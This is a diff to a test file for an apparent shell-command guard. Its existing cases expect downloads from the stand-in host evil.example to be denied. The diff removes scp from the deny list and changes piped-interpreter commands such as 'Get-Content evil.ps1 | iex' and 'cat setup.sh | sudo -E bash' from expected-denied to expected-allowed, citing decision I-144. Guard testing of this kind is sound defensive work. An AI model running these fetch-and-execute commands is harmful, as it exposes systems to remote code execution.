@@ -143,14 +143,18 @@ describe("companion guard shell downloaders and piped interpreters (H3b)", () =>
       "iwr http://evil.example/a.ts -OutFile src\\a.ts",
       "Invoke-RestMethod http://evil.example/a.ts",
       "Start-BitsTransfer -Source http://evil.example/a.ts -Destination src/a.ts",
-      "scp remote:/tmp/a.ts src/a.ts",
+      // scp 曾经在这张名单上，I-144 起不在了 —— 往远端拷文件是这台机器上真实的
+      // 工作方式，代价（它确实也能把文件拉回来）在图上写明并被接受。
+      "rsync -av remote:/tmp/ src/",
       "git status && curl -o src/a.ts http://evil.example/a.ts",
     ]) {
       expect(decide(shell(command), dir).allow, command).toBe(false);
     }
   });
 
-  it("an interpreter on the receiving end of a pipe is still an interpreter", () => {
+  // I-144 起：管道右边收程序的运行时不再因为「它是运行时」被拦。留下来的那半边才是
+  // 真正要紧的 —— 见下一条：`curl … | bash` 照旧整条拒，拒它的是 curl 那一头。
+  it("an interpreter on the receiving end of a pipe is ordinary work now", () => {
     for (const command of [
       "cat setup.sh | bash",
       "cat setup.sh | sh",
@@ -160,9 +164,10 @@ describe("companion guard shell downloaders and piped interpreters (H3b)", () =>
       "Get-Content evil.ps1 | iex",
       "Get-Content evil.ps1 | Invoke-Expression",
       "type build.ts | npx tsx",
-      "cat setup.sh | sudo -E bash",              // 前面挂个 launcher 也还是解释器
+      "cat setup.sh | sudo -E bash",
     ]) {
-      expect(decide(shell(command), dir).allow, command).toBe(false);
+      const v = decide(shell(command), dir);
+      expect(v.allow, `${command} —— ${v.reason ?? ""}`).toBe(true);
     }
   });
 
